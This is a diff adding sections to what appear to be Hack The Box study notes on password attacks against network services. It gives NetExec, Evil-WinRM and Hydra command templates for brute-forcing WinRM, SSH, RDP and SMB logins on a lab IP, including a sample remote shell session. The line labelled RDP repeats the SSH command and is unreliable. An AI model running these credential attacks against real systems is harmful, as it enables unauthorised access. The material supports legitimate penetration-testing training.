@@ -760,3 +760,41 @@ Apart from web applications, these services include (but are not limited to) `F
 For security reasons, WinRM must be activated and configured manually in Windows 10/11. Therefore, it depends heavily on the environment security in a domain or local network where we want to use WinRM. In most cases, one uses certificates or only specific authentication mechanisms to increase its security. By default, WinRM uses the TCP ports `5985` (`HTTP`) and `5986` (`HTTPS`).
 
 A handy tool that we can use for our password attacks is [NetExec](https://github.com/Pennyw0rth/NetExec), which can also be used for other protocols such as SMB, LDAP, MSSQL, and others. We recommend reading the [official documentation](https://www.netexec.wiki/) for this tool to become familiar with it.
+
+##### NetExec
+General Structure for the command : 
+```shell-session
+ShibuShivansh@htb[/htb]$ netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
+```
+
+##### Evil-WinRM
+Structure for the command : 
+```shell-session
+ShibuShivansh@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
+```
+
+```shell-session
+ShibuShivansh@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password
+
+Evil-WinRM shell v3.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\user\Documents>
+```
+
+##### Hydra
+Command to attack SSH Port for a particular IP with given usernames and password list.
+```shell-session
+hydra -L user.list -P password.list ssh://10.129.42.197
+```
+
+Command to attack RDP :
+```shell-session
+hydra -L user.list -P password.list ssh://10.129.42.197
+```
+
+Command to attack SMB :
+```shell-session
+ hydra -L user.list -P password.list smb://10.129.42.197
+```
